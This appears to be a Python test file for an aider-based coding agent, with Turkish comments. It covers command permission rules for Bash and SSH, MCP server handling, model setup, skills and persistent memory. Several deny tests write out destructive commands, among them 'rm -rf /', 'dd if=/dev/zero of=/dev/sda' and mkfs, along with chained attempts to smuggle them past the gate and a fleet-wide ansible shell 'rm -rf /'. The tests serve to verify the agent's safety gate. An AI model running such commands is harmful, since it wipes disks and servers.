        for komut in ("rm -rf /", "mkfs.ext4 /dev/sdb", "dd if=/dev/zero of=/dev/sda"):
            with self.subTest(komut=komut):
                self.assertEqual(self._ssh(komut), DENY)

    def test_middle_tier_also_applies_to_remote_commands(self):
        for komut in ("reboot", "shutdown -h now", "sudo rm x"):
            with self.subTest(komut=komut):
                self.assertEqual(self._ssh(komut), ASK)

    def test_remote_chain_cannot_smuggle_denied_command(self):
        self.assertEqual(self._ssh("uptime && sudo reboot"), ASK)
        self.assertEqual(self._ssh("uptime; rm -rf /"), DENY)

    def test_harmless_remote_command_still_runs_in_auto(self):
        self.assertEqual(self._ssh("uptime"), ALLOW)

    def test_bash_allow_does_not_leak_to_ssh(self):
        # Reddi genisletmek guvenli, izni genisletmek degil. Yerelde izin
        # verilen bir komut uzakta sessizce izinli sayilmamali.
        p = PermissionSet(allow=["Bash(uptime:*)"], mode=MODE_ASK)
        self.assertEqual(p.decide("Ssh", {"host": "s", "command": "uptime"}, True), ASK)

    def test_explicit_ssh_rule_still_works(self):
        p = PermissionSet(allow=["Ssh(uptime:*)"], mode=MODE_ASK)
        self.assertEqual(p.decide("Ssh", {"host": "s", "command": "uptime"}, True), ALLOW)


class TestPermissionConfigLoading(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        (self.root / ".aider").mkdir()

    def tearDown(self):
        self.tmp.cleanup()

    def _write(self, text):
        (self.root / ".aider" / "permissions.yml").write_text(text, encoding="utf-8")

    def test_loads_rules_and_mode(self):
        from aider.agent.permissions import load_permissions

        self._write("mode: auto\nallow:\n  - Bash(ls:*)\ndeny:\n  - Bash(halt:*)\n")
        with patch("pathlib.Path.home", return_value=self.root / "yok"):
            p = load_permissions(self.root)
        self.assertEqual(p.mode, "auto")
        self.assertTrue(any(r.raw == "Bash(ls:*)" for r in p.allow))
        self.assertTrue(any(r.raw == "Bash(halt:*)" for r in p.deny))

    def test_missing_file_yields_safe_default(self):
        from aider.agent.permissions import load_permissions

        with patch("pathlib.Path.home", return_value=self.root / "yok"):
            p = load_permissions(self.root)
        self.assertEqual(p.mode, MODE_ASK)

    def test_malformed_file_raises(self):
        from aider.agent.permissions import load_permissions

        self._write("- bu bir liste, sözlük değil\n")
        with patch("pathlib.Path.home", return_value=self.root / "yok"):
            with self.assertRaises(ValueError):
                load_permissions(self.root)

    def test_bad_rule_syntax_raises(self):
        from aider.agent.permissions import load_permissions

        self._write("allow:\n  - 'Bash('\n")
        with patch("pathlib.Path.home", return_value=self.root / "yok"):
            with self.assertRaises(ValueError):
                load_permissions(self.root)

    def test_cli_mode_overrides_file_mode(self):
        from aider.agent.permissions import load_permissions

        self._write("mode: auto\n")
        with patch("pathlib.Path.home", return_value=self.root / "yok"):
            p = load_permissions(self.root, mode=MODE_AUTO)
        self.assertEqual(p.mode, MODE_AUTO)


# ---------------------------------------------------------------------------
# MCP
# ---------------------------------------------------------------------------

import sys  # noqa: E402

from aider.agent.mcp import (  # noqa: E402
    MCPError,
    MCPManager,
    MCPServer,
    MCPTool,
    find_config,
    read_config,
)

FIXTURE_SERVER = str(Path(__file__).parent.parent / "fixtures" / "mcp_echo_server.py")


class MCPServerTestCase(unittest.TestCase):
    """Gerçek bir alt süreçle konuşan MCP testleri için ortak taban."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.servers = []

    def tearDown(self):
        for s in self.servers:
            s.stop()
        self.tmp.cleanup()

    def make_server(self, name="test", mode=None):
        env = {"MCP_TEST_MODE": mode} if mode else None
        s = MCPServer(name, sys.executable, [FIXTURE_SERVER], env=env)
        self.servers.append(s)
        return s

    def write_config(self, servers, filename=".mcp.json"):
        path = self.root / filename
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps({"mcpServers": servers}), encoding="utf-8")
        return path


class TestMCPServer(MCPServerTestCase):
    def test_handshake_and_tool_discovery(self):
        server = self.make_server()
        tools = server.start()
        names = {t["name"] for t in tools}
        self.assertEqual(names, {"echo", "write_thing", "fail"})

    def test_tool_call_round_trip(self):
        server = self.make_server()
        server.start()
        self.assertEqual(server.call_tool("echo", {"text": "merhaba"}), "merhaba")

    def test_server_error_response_is_returned_as_text(self):
        server = self.make_server()
        server.start()
        out = server.call_tool("fail", {})
        self.assertTrue(out.startswith("Hata:"))
        self.assertIn("bilerek hata", out)

    def test_unknown_tool_raises_mcp_error(self):
        server = self.make_server()
        server.start()
        with self.assertRaises(MCPError):
            server.call_tool("yok_boyle_bir_arac", {})

    def test_non_json_output_is_ignored(self):
        # Sunucu stdout'a düz metin karıştırırsa istemci bunu yutmalı.
        server = self.make_server(mode="noise")
        server.start()
        self.assertEqual(server.call_tool("echo", {"text": "x"}), "x")

    def test_crashing_server_raises_quickly(self):
        server = self.make_server(mode="crash")
        with self.assertRaises(MCPError):
            server.start()

    def test_missing_command_raises(self):
        server = MCPServer("yok", "/bin/kesinlikle-boyle-bir-komut-yok", [])
        self.servers.append(server)
        with self.assertRaises(MCPError):
            server.start()

    def test_hanging_server_times_out_instead_of_blocking(self):
        # Bu testin asıl amacı: takılan sunucu oturumu süresiz dondurmamalı.
        import aider.agent.mcp as mcp_mod

        server = self.make_server(mode="hang")
        with patch.object(mcp_mod, "STARTUP_TIMEOUT", 2):
            start = time.monotonic()
            with self.assertRaises(MCPError) as cm:
                server.start()
            elapsed = time.monotonic() - start
        self.assertIn("yanıt vermedi", str(cm.exception))
        self.assertLess(elapsed, 15, "zaman aşımı uygulanmadı, istemci bloke oldu")

    def test_stop_is_idempotent(self):
        server = self.make_server()
        server.start()
        server.stop()
        server.stop()
        self.assertFalse(server.is_alive())


class TestMCPTool(MCPServerTestCase):
    def setUp(self):
        super().setUp()
        self.server = self.make_server()
        self.specs = {t["name"]: t for t in self.server.start()}
        self.ctx = make_ctx(self.root)

    def test_tool_name_is_namespaced(self):
        tool = MCPTool(self.server, self.specs["echo"])
        self.assertEqual(tool.name, "mcp__test__echo")

    def test_read_only_hint_skips_confirmation(self):
        tool = MCPTool(self.server, self.specs["echo"])
        self.assertFalse(tool.mutating)

    def test_tool_without_hint_requires_confirmation(self):
        tool = MCPTool(self.server, self.specs["write_thing"])
        self.assertTrue(tool.mutating)

    def test_schema_comes_from_server(self):
        tool = MCPTool(self.server, self.specs["echo"])
        self.assertEqual(tool.parameters["properties"]["text"]["type"], "string")

    def test_run_returns_server_output(self):
        tool = MCPTool(self.server, self.specs["echo"])
        self.assertEqual(tool.run(self.ctx, text="selam"), "selam")

    def test_declined_confirmation_blocks_call(self):
        ctx = make_ctx(self.root, confirm=False)
        ctx.permissions = None
        tool = MCPTool(self.server, self.specs["write_thing"])
        self.assertIn("reddetti", tool.run(ctx, value="x"))

    def test_dead_server_surfaces_tool_error(self):
        tool = MCPTool(self.server, self.specs["echo"])
        self.server.stop()
        with self.assertRaises(ToolError):
            tool.run(self.ctx, text="x")


class TestMCPConfig(MCPServerTestCase):
    def test_reads_mcp_json(self):
        path = self.write_config({"a": {"command": "echo", "args": ["hi"]}})
        self.assertEqual(find_config(self.root), path)
        self.assertIn("a", read_config(path))

    def test_finds_config_under_aider_dir(self):
        path = self.write_config({"a": {"command": "echo"}}, filename=".aider/mcp.json")
        self.assertEqual(find_config(self.root), path)

    def test_no_config_returns_none(self):
        self.assertIsNone(find_config(self.root))

    def test_missing_command_raises(self):
        path = self.root / ".mcp.json"
        path.write_text(json.dumps({"mcpServers": {"a": {"args": []}}}), encoding="utf-8")
        with self.assertRaises(MCPError):
            read_config(path)

    def test_missing_servers_key_raises(self):
        path = self.root / ".mcp.json"
        path.write_text(json.dumps({"baska": {}}), encoding="utf-8")
        with self.assertRaises(MCPError):
            read_config(path)

    def test_invalid_json_raises(self):
        path = self.root / ".mcp.json"
        path.write_text("{bozuk", encoding="utf-8")
        with self.assertRaises(MCPError):
            read_config(path)


class TestMCPManager(MCPServerTestCase):
    def _manager(self):
        mgr = MCPManager(MagicMock(), str(self.root))
        self.addCleanup(mgr.shutdown)
        return mgr

    def test_loads_tools_from_configured_server(self):
        self.write_config({"t": {"command": sys.executable, "args": [FIXTURE_SERVER]}})
        mgr = self._manager()
        tools = mgr.load()
        self.assertEqual(len(tools), 3)
        self.assertEqual(mgr.errors, [])
        self.assertIn("t (3 araç)", mgr.summary())

    def test_no_config_yields_no_tools(self):
        mgr = self._manager()
        self.assertEqual(mgr.load(), [])
        self.assertIsNone(mgr.summary())

    def test_failing_server_does_not_stop_the_others(self):
        # Kritik: bir sunucunun çökmesi oturumu düşürmemeli.
        self.write_config(
            {
                "olen": {
                    "command": sys.executable,
                    "args": [FIXTURE_SERVER],
                    "env": {"MCP_TEST_MODE": "crash"},
                },
                "saglam": {"command": sys.executable, "args": [FIXTURE_SERVER]},
            }
        )
        mgr = self._manager()
        tools = mgr.load()
        self.assertEqual(len(tools), 3)
        self.assertEqual(len(mgr.errors), 1)
        self.assertIn("olen", mgr.errors[0])
        self.assertIn("başlatılamadı", mgr.summary())

    def test_shutdown_stops_servers(self):
        self.write_config({"t": {"command": sys.executable, "args": [FIXTURE_SERVER]}})
        mgr = self._manager()
        mgr.load()
        server = mgr.servers["t"]
        mgr.shutdown()
        self.assertFalse(server.is_alive())
        self.assertEqual(mgr.tools, [])


# ---------------------------------------------------------------------------
# /model-ekle
# ---------------------------------------------------------------------------

import yaml  # noqa: E402

from aider.agent.model_setup import ModelSetupCancelled, run_setup  # noqa: E402


class TestModelSetup(unittest.TestCase):
    """Cevap sırası: adres, anahtar, model, pencere, çıktı.

    "Endpoint tipi" sorusu kaldırıldı: üç seçenek de aynı litellm
    sağlayıcısını kullanıyordu, soru yalnızca varsayılan adresi seçiyordu.

    Anahtar ancak model listesi anahtarsız alınamazsa soruluyor. Testlerde
    _istek yamalı olduğu için liste hiç gelmiyor, yani anahtar her zaman
    soruluyor.
    """

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.home = Path(self.tmp.name)
        self.io = MagicMock()
        # Testler ağa çıkmamalı. Yamalanmazsa her kurulum akışı gerçek bir
        # HTTP isteği denerdi; bu depoda ağa çıkan test daha önce yaşandı.
        self.istek = patch("aider.agent.model_setup._istek", return_value=None)
        self.istek.start()
        self.addCleanup(self.istek.stop)

    def tearDown(self):
        self.tmp.cleanup()

    def _run(self, answers):
        self.io.prompt_ask.side_effect = answers
        return run_setup(self.io, home=self.home)

    def _conf(self):
        return yaml.safe_load((self.home / ".aider.conf.yml").read_text(encoding="utf-8"))

    def _meta(self):
        yol = self.home / ".aider" / "model.metadata.json"
        return json.loads(yol.read_text(encoding="utf-8"))

    def _settings(self):
        yol = self.home / ".aider" / "model.settings.yml"
        return yaml.safe_load(yol.read_text(encoding="utf-8"))

    def test_corporate_endpoint_writes_all_three_files(self):
        name, written = self._run(["https://llm.kurum/v1", "anahtar", "qwen3-coder", "", ""])
        self.assertEqual(name, "openai/qwen3-coder")
        self.assertEqual(len(written), 3)
        for path in written:
            self.assertTrue(Path(path).is_file())

    def test_prefix_is_added_once(self):
        name, _ = self._run(["https://x/v1", "k", "qwen3-coder", "", ""])
        self.assertEqual(name, "openai/qwen3-coder")

    def test_user_supplied_prefix_is_not_doubled(self):
        name, _ = self._run(["https://x/v1", "k", "openai/qwen3-coder", "", ""])
        self.assertEqual(name, "openai/qwen3-coder")

    def test_ollama_uses_openai_provider_not_ollama_chat(self):
        # litellm'in 'ollama_chat/' sağlayıcısı araç sonucu mesajlarını modele
        # ulaştırmıyor; model sonucu görmediği için sonsuz döngüye giriyor.
        # Ollama'nın OpenAI uyumlu /v1 ucu doğru çalıştığı için o kullanılıyor.
        name, _ = self._run(["http://localhost:11434/v1", "", "qwen3-coder:30b", "", ""])
        self.assertTrue(name.startswith("openai/"), name)
        self.assertNotIn("ollama_chat", name)

    def test_yazilan_adres_v1_ile_biter(self):
        # /v1 olmadan OpenAI uyumlu uç çalışmaz.
        self._run(["sunucu:8000", "", "m", "", ""])
        self.assertEqual(self._conf()["openai-api-base"], "http://sunucu:8000/v1")

    def test_bos_adres_reddedilir(self):
        # Eskiden boş adres endpoint tipinin varsayılanına düşüyordu. Adressiz
        # yapılandırma sessizce api.openai.com'a gidiyor; hava boşluklu ortamda
        # bu sessiz bir sızıntı.
        with self.assertRaises(ModelSetupCancelled):
            self._run(["", "", "m", "", ""])

    def test_yardimci_dosyalar_tek_dizinde(self):
        self._run(["https://x/v1", "k", "m", "", ""])
        self.assertTrue((self.home / ".aider" / "model.settings.yml").is_file())
        self.assertTrue((self.home / ".aider" / "model.metadata.json").is_file())

    def test_conf_yardimci_dosyalari_gosteriyor(self):
        # aider'ın üç dosyası tek dosyada birleştirilemiyor; conf ikisini
        # göstermezse ~/.aider altındaki dosyalar hiç okunmaz.
        self._run(["https://x/v1", "k", "m", "", ""])
        conf = self._conf()
        self.assertEqual(
            conf["model-settings-file"], str(self.home / ".aider" / "model.settings.yml")
        )
        self.assertEqual(
            conf["model-metadata-file"], str(self.home / ".aider" / "model.metadata.json")
        )

    def test_eski_konumdaki_tanimlar_tasiniyor(self):
        eski = self.home / ".aider.model.metadata.json"
        eski.write_text(json.dumps({"openai/onceki": {"max_input_tokens": 4096}}), encoding="utf-8")
        self._run(["https://x/v1", "k", "yeni", "", ""])
        self.assertIn("openai/onceki", self._meta())
        self.assertIn("openai/yeni", self._meta())

    def test_second_model_replaces_not_duplicates(self):
        self._run(["https://x/v1", "k", "model-a", "", ""])
        self._run(["https://y/v1", "k", "model-a", "", ""])
        names = [s["name"] for s in self._settings()]
        self.assertEqual(names.count("openai/model-a"), 1)

    def test_adding_a_model_keeps_the_previous_one(self):
        self._run(["https://x/v1", "k", "model-a", "", ""])
        self._run(["https://x/v1", "k", "model-b", "", ""])
        names = {s["name"] for s in self._settings()}
        self.assertEqual(names, {"openai/model-a", "openai/model-b"})
        self.assertEqual(set(self._meta()), {"openai/model-a", "openai/model-b"})

    def test_empty_model_name_is_rejected(self):
        with self.assertRaises(ModelSetupCancelled):
            self._run(["https://x/v1", "k", "", "", ""])

    def test_edit_format_defaults_to_agent(self):
        self._run(["https://x/v1", "k", "m", "", ""])
        self.assertEqual(self._conf()["edit-format"], "agent")
        self.assertEqual(self._settings()[0]["edit_format"], "agent")

    def test_metadata_declares_function_calling(self):
        name, _ = self._run(["https://x/v1", "k", "m", "", ""])
        # Agent modu tool calling'e bağlı; metadata bunu bildirmezse aider
        # modeli araçsız sanabilir.
        self.assertTrue(self._meta()[name]["supports_function_calling"])

    def test_custom_context_window_is_honoured(self):
        name, _ = self._run(["https://x/v1", "k", "m", "128000", "4096"])
        self.assertEqual(self._meta()[name]["max_input_tokens"], 128000)
        self.assertEqual(self._meta()[name]["max_output_tokens"], 4096)

    def test_config_file_is_not_world_readable(self):
        # Dosya API anahtarı taşıyor.
        self._run(["https://x/v1", "gizli", "m", "", ""])
        mode = (self.home / ".aider.conf.yml").stat().st_mode & 0o777
        self.assertEqual(mode, 0o600)

    def test_invalid_context_is_reprompted(self):
        # 'abc' ve '0' reddedilmeli, sonra 5000 kabul edilmeli.
        name, _ = self._run(["https://x/v1", "k", "m", "abc", "0", "5000", ""])
        self.assertEqual(self._meta()[name]["max_input_tokens"], 5000)


class TestAyarDosyasiSirasi(unittest.TestCase):
    """~/.aider/ altındaki dosya ev dizinindeki eskisini ezmeli.

    generate_search_path_list varsayılan adı HER ZAMAN listeye koyuyor, yani
    eski ~/.aider.model.settings.yml silinmedikçe okunmaya devam ediyor.
    Belirleyici olan sıra: liste ters çevrildiği için conf'un gösterdiği dosya
    en sona düşüyor ve register_models sonrakini kazandırıyor. Bu sıra bozulursa
    /model-ekle ile tanımlanan model sessizce eski ayarlarla çalışır.
    """

    def test_conf_gosterdigi_dosya_en_sonda(self):
        from aider.main import generate_search_path_list

        yollar = [
            str(y)
            for y in generate_search_path_list(
                ".aider.model.settings.yml", "/tmp/repo", "/root/.aider/model.settings.yml"
            )
        ]
        self.assertTrue(yollar[-1].endswith("/.aider/model.settings.yml"), yollar)

    def test_ev_dizinindeki_eski_ad_hala_aranıyor(self):
        from aider.main import generate_search_path_list

        yollar = [
            str(y)
            for y in generate_search_path_list(
                ".aider.model.settings.yml", None, "/root/.aider/model.settings.yml"
            )
        ]
        self.assertTrue(
            any(y.endswith("/.aider.model.settings.yml") for y in yollar),
            "eski ad listeden düşerse kullanıcıya 'silebilirsin' demek yanlış olur",
        )


class TestTabanAdresi(unittest.TestCase):
    """Kullanıcı tarayıcıdan ne yapıştırırsa yapıştırsın çalışmalı."""

    def test_bicimler(self):
        from aider.agent.model_setup import taban_adresi

        beklenen = {
            "http://sunucu:8000/v1": "http://sunucu:8000/v1",
            "http://sunucu:8000/v1/": "http://sunucu:8000/v1",
            "http://sunucu:8000": "http://sunucu:8000/v1",
            "sunucu:8000": "http://sunucu:8000/v1",
            "https://llm.kurum/api/v1/models": "https://llm.kurum/api/v1",
            "https://llm.kurum/v1/chat/completions": "https://llm.kurum/v1",
            "  http://sunucu:8000/v1  ": "http://sunucu:8000/v1",
            "": "",
        }
        for girdi, cikti in beklenen.items():
            with self.subTest(girdi=girdi):
                self.assertEqual(taban_adresi(girdi), cikti)


# ---------------------------------------------------------------------------
# Depodaki beceriler
# ---------------------------------------------------------------------------

REPO_ROOT = Path(__file__).resolve().parent.parent.parent


class TestShippedSkills(unittest.TestCase):
    """Depoyla gelen becerilerin gerçekten yüklenebildiğini doğrula."""

    def setUp(self):
        from aider.agent.skills import SkillLibrary

        self.lib = SkillLibrary([REPO_ROOT / "aider" / "beceriler"])

    def test_skills_are_discovered(self):
        self.assertTrue(self.lib.skills, "aider/beceriler/ altında beceri bulunamadı")

    def test_beceriler_depo_disinda_da_bulunur(self):
        """Beceriler yalnızca depo içinde değil, her çalışma dizininde görünmeli.

        Ölçülen arıza: depo /root/aider'a klonlanıp /root/aider-work içinde
        çalışılınca "Beceriler: 0 yüklendi" oluyordu. Yerleşik beceriler
        paketin içinde durduğu için artık çalışma dizini önemsiz.
        """
        with tempfile.TemporaryDirectory() as baska_dizin:
            disarda = SkillLibrary(default_skill_roots(baska_dizin))
        self.assertGreaterEqual(len(disarda.skills), len(self.lib.skills))

    def test_every_skill_has_a_trigger_description(self):
        # Açıklama olmadan model beceriyi hiç tetikleyemez.
        for skill in self.lib.skills.values():
            self.assertTrue(skill.description, f"{skill.name}: description yok")
            self.assertGreater(
                len(skill.description), 30, f"{skill.name}: açıklama tetikleme için fazla kısa"
            )

    def test_every_skill_has_a_body(self):
        for skill in self.lib.skills.values():
            self.assertGreater(len(skill.body.strip()), 200, f"{skill.name}: gövde fazla kısa")

    def test_catalog_lists_all_skills(self):
        catalog = self.lib.catalog()
        for name in self.lib.skills:
            self.assertIn(name, catalog)

    def test_skill_name_matches_directory(self):
        for name, skill in self.lib.skills.items():
            self.assertEqual(
                name, skill.path.parent.name, f"{name}: frontmatter adı dizin adıyla uyuşmuyor"
            )


class TestPrefixVersusGlob(unittest.TestCase):
    """':*' ile '*' arasındaki fark, sessizce delik bırakabildiği için teste bağlı.

    ':*' öneki sözcük sınırında durur — komut adının yarısı eşleşince kural
    tetiklenmesin diye. Ama bu, dosya adı öneki eşleştirmeyi imkânsız kılıyor.
    Bu ayrım iki kez gerçek hataya yol açtı: yerleşik deny listesindeki
    'mkfs:*' kuralı 'mkfs.ext4' komutunu kaçırıyordu, ve örnek altyapı
    kurallarındaki 'playbooks/duzelt_:*' kuralı 'duzelt_ntp.yml' dosyasını.
    """

    def test_colon_star_stops_at_word_boundary(self):
        # use_default_deny=False: yerleşik liste zaten 'mkfs*' içeriyor ve
        # sözdizimini izole edemezdik.
        p = PermissionSet(deny=["Bash(mkfs:*)"], mode=MODE_AUTO, use_default_deny=False)
        # Boşlukla ayrılan argüman: yakalanır.
        self.assertEqual(p.decide("Bash", {"command": "mkfs /dev/sda"}, True), DENY)
        # Nokta ile devam eden alt komut: yakalanmaz.
        self.assertEqual(p.decide("Bash", {"command": "mkfs.ext4 /dev/sda"}, True), ALLOW)

    def test_glob_matches_across_word_boundary(self):
        p = PermissionSet(deny=["Bash(mkfs*)"], mode=MODE_AUTO, use_default_deny=False)
        self.assertEqual(p.decide("Bash", {"command": "mkfs.ext4 /dev/sda"}, True), DENY)

    def test_builtin_deny_list_uses_glob_for_mkfs(self):
        # Bu tam olarak sahada kaçırılan komuttu; yerleşik liste artık yakalamalı.
        p = PermissionSet(mode=MODE_AUTO)
        self.assertEqual(p.decide("Bash", {"command": "mkfs.ext4 /dev/sda"}, True), DENY)

    # Bu iki test kuralın GENİŞLİĞİNİ ölçüyor, yani "reddedildi mi". Eşleşmeyen
    # durumun sonucu ALLOW değil ASK: ansible-playbook artık DEFAULT_ASK'te,
    # oto modda bile onay istiyor. Ölçülen şey reddetmenin sızıp sızmadığı.

    def test_path_prefix_needs_glob_not_colon_star(self):
        cmd = "ansible-playbook -i envanter/hosts.yml playbooks/duzelt_ntp.yml"

        colon = PermissionSet(deny=["Bash(ansible-playbook*playbooks/duzelt_:*)"], mode=MODE_AUTO)
        self.assertNotEqual(colon.decide("Bash", {"command": cmd}, True), DENY)

        glob = PermissionSet(deny=["Bash(ansible-playbook*playbooks/duzelt_*)"], mode=MODE_AUTO)
        self.assertEqual(glob.decide("Bash", {"command": cmd}, True), DENY)

    def test_glob_rule_is_not_over_broad(self):
        p = PermissionSet(deny=["Bash(ansible-playbook*playbooks/duzelt_*)"], mode=MODE_AUTO)
        # Farklı playbook etkilenmemeli
        self.assertNotEqual(
            p.decide("Bash", {"command": "ansible-playbook playbooks/durum_ntp.yml"}, True), DENY
        )
        # Farklı komut etkilenmemeli: echo hiçbir varsayılan kurala da takılmaz.
        self.assertEqual(
            p.decide("Bash", {"command": "echo playbooks/duzelt_ntp.yml"}, True), ALLOW
        )


class TestInfraTemplateRules(unittest.TestCase):
    """ornek/altyapi/ altındaki kuralların gerçekten koruduğunu doğrula."""

    def setUp(self):
        rules = yaml.safe_load(
            (REPO_ROOT / "ornek" / "altyapi" / "ornek-permissions.yml").read_text(encoding="utf-8")
        )
        self.p = PermissionSet(allow=rules["allow"], deny=rules["deny"], mode=MODE_AUTO)

    def test_adhoc_fleet_shell_is_denied(self):
        # En tehlikeli kalıp: modelin ürettiği kabuk kodunun tüm filoda çalışması.
        for cmd in [
            'ansible all -m shell -a "rm -rf /"',
            "ansible all -m command -a uptime",
            "ansible all -m raw -a whoami",
        ]:
            self.assertEqual(self.p.decide("Bash", {"command": cmd}, True), DENY, cmd)

    def test_mutating_playbook_is_denied(self):
        for cmd in [
            "ansible-playbook -i envanter/hosts.yml playbooks/duzelt_ntp.yml",
            "ansible-playbook playbooks/duzelt_ntp.yml --check",
        ]:
            self.assertEqual(self.p.decide("Bash", {"command": cmd}, True), DENY, cmd)

    def test_readonly_playbook_is_allowed(self):
        self.assertEqual(
            self.p.decide(
                "Bash",
                {"command": "ansible-playbook -i envanter/hosts.yml playbooks/durum_ntp.yml"},
                True,
            ),
            ALLOW,
        )

    def test_chaining_cannot_smuggle_adhoc_shell(self):
        cmd = "ansible-playbook playbooks/durum_ntp.yml && ansible all -m shell -a x"
        self.assertEqual(self.p.decide("Bash", {"command": cmd}, True), DENY)


class TestInfraTemplateSkill(unittest.TestCase):
    def test_skill_loads(self):
        from aider.agent.skills import SkillLibrary

        lib = SkillLibrary([REPO_ROOT / "ornek" / "altyapi" / "skills"])
        self.assertIn("filo-durum-kontrolu", lib.skills)
        skill = lib.get("filo-durum-kontrolu")
        self.assertEqual(skill.name, skill.path.parent.name)
        self.assertGreater(len(skill.body), 1000)


# ---------------------------------------------------------------------------
# Bellek ve proje talimatları
# ---------------------------------------------------------------------------

from aider.agent.memory import (  # noqa: E402
    INSTRUCTION_FILES,
    MemoryStore,
    _slug,
    default_memory_roots,
    load_instructions,
)


class TestSlug(unittest.TestCase):
    def test_turkish_characters_become_ascii(self):
        self.assertEqual(_slug("Üretim Kümesi Ayarı"), "uretim-kumesi-ayari")

    def test_punctuation_is_stripped(self):
        self.assertEqual(_slug("Rapor: CSV / ayraç!"), "rapor-csv-ayrac")

    def test_empty_falls_back(self):
        self.assertEqual(_slug("!!!"), "not")

    def test_length_is_capped(self):
        self.assertLessEqual(len(_slug("x" * 200)), 48)


class TestProjectInstructions(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_no_file_yields_empty(self):
        text, found = load_instructions(self.root)
        self.assertEqual(text, "")
        self.assertEqual(found, [])

    def test_agents_md_is_loaded(self):
        (self.root / "AGENTS.md").write_text("Tüm yorumlar Türkçe.", encoding="utf-8")
        text, found = load_instructions(self.root)
        self.assertIn("Tüm yorumlar Türkçe.", text)
        self.assertEqual([p.name for p in found], ["AGENTS.md"])

    def test_multiple_files_are_all_included(self):
        (self.root / "AGENTS.md").write_text("kural bir", encoding="utf-8")
        (self.root / "CONVENTIONS.md").write_text("kural iki", encoding="utf-8")
        text, found = load_instructions(self.root)
        self.assertIn("kural bir", text)
        self.assertIn("kural iki", text)
        self.assertEqual(len(found), 2)

    def test_empty_file_is_skipped(self):
        (self.root / "AGENTS.md").write_text("   \n", encoding="utf-8")
        text, found = load_instructions(self.root)
        self.assertEqual(found, [])

    def test_known_names_include_claude_md(self):
        self.assertIn("CLAUDE.md", INSTRUCTION_FILES)


class TestMemoryStore(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name) / "mem"
        self.store = MemoryStore([self.root])

    def tearDown(self):
        self.tmp.cleanup()

    def test_write_then_read_back(self):
        self.store.write("Üretim kümesi", "prod-01, cuma değişiklik yok", "ortam")
        fresh = MemoryStore([self.root])
        self.assertIn("Üretim kümesi", fresh.notes)
        self.assertEqual(fresh.notes["Üretim kümesi"].tur, "ortam")
        self.assertIn("prod-01", fresh.notes["Üretim kümesi"].body)

    def test_note_survives_a_new_store(self):
        # Asıl amaç: oturumlar arası kalıcılık.
        self.store.write("Rapor tercihi", "CSV, ayraç noktalı virgül", "tercih")
        self.assertIn("CSV", MemoryStore([self.root]).render())

    def test_rewriting_same_title_overwrites(self):
        self.store.write("Hedef", "eski", "proje")
        self.store.write("Hedef", "yeni", "proje")
        self.assertEqual(len(self.store.notes), 1)
        self.assertIn("yeni", self.store.notes["Hedef"].body)

    def test_delete_removes_note_and_file(self):
        path = self.store.write("Gecici", "silinecek", "proje")
        self.store.delete("Gecici")
        self.assertNotIn("Gecici", self.store.notes)
        self.assertFalse(path.exists())

    def test_delete_unknown_returns_none(self):
        self.assertIsNone(self.store.delete("yok"))

    def test_invalid_type_rejected(self):
        with self.assertRaises(ToolError):
            self.store.write("x", "y", "saçma-tür")

    def test_empty_body_rejected(self):
        with self.assertRaises(ToolError):
            self.store.write("x", "   ", "proje")

    def test_empty_title_rejected(self):
        with self.assertRaises(ToolError):
            self.store.write("  ", "gövde", "proje")

    def test_render_includes_type_and_body(self):
        self.store.write("Hedef", "gövde metni", "proje")
        out = self.store.render()
        self.assertIn("[proje]", out)
        self.assertIn("gövde metni", out)

    def test_empty_store_renders_empty(self):
        self.assertEqual(self.store.render(), "")

    def test_budget_drops_oldest_and_reports_count(self):
        # Bütçe artık parametre: modül sabitini yamalamak işe yaramaz, çünkü
        # varsayılan argüman tanım anında bağlanıyor. AgentCoder bu değeri
        # modelin bağlam penceresinden hesaplayıp geçiriyor.
        long_body = "x" * 3000
        for i in range(10):
            self.store.write(f"Not {i}", long_body, "proje")

        rendered = self.store.render(6000)
        self.assertLessEqual(len(rendered), 6000)
        self.assertGreater(self.store.dropped(6000), 0)

    def test_varsayilan_butce_tavani(self):
        from aider.agent.memory import MEMORY_BUDGET

        for i in range(10):
            self.store.write(f"Not {i}", "x" * 3000, "proje")
        self.assertLessEqual(len(self.store.render()), MEMORY_BUDGET)

    def test_first_root_wins_on_name_collision(self):
        kisisel = Path(self.tmp.name) / "kisisel"
        paylasilan = Path(self.tmp.name) / "paylasilan"
        MemoryStore([kisisel]).write("Hedef", "kişisel sürüm", "proje")
        MemoryStore([paylasilan]).write("Hedef", "paylaşılan sürüm", "proje")

        store = MemoryStore([kisisel, paylasilan])
        self.assertIn("kişisel sürüm", store.notes["Hedef"].body)

    def test_default_roots_include_shared_dir(self):
        from aider.agent.memory import SHARED_MEMORY_DIR

        roots = [str(r) for r in default_memory_roots("/proje")]
        self.assertTrue(any(r.endswith(SHARED_MEMORY_DIR) for r in roots))


class TestMemoryInAgentCoder(unittest.TestCase):
    """Notların ve talimatların gerçekten sistem promptuna girdiğini doğrula."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.prev = os.getcwd()
        os.chdir(self.root)

    def tearDown(self):
        os.chdir(self.prev)
        self.tmp.cleanup()

    def _coder(self):
        from aider.coders import Coder
        from aider.io import InputOutput
        from aider.models import Model

        return Coder.create(
            main_model=Model("gpt-4o"),
            edit_format="agent",
            io=InputOutput(yes=True, pretty=False, fancy_input=False),
            fnames=[],
            use_git=False,
            stream=False,
        )

    def test_instructions_reach_the_system_prompt(self):
        (self.root / "AGENTS.md").write_text("Yorumlar Türkçe yazılır.", encoding="utf-8")
        coder = self._coder()
        prompt = coder.fmt_system_prompt(coder.gpt_prompts.main_system)
        self.assertIn("Yorumlar Türkçe yazılır.", prompt)

    def test_memory_reaches_the_system_prompt(self):
        coder = self._coder()
        coder.ctx.memory.write("Rapor tercihi", "Her zaman CSV", "tercih")
        coder.ctx.memory.load()
        prompt = coder.fmt_system_prompt(coder.gpt_prompts.main_system)
        self.assertIn("Her zaman CSV", prompt)

    def test_hatirla_tool_is_offered(self):
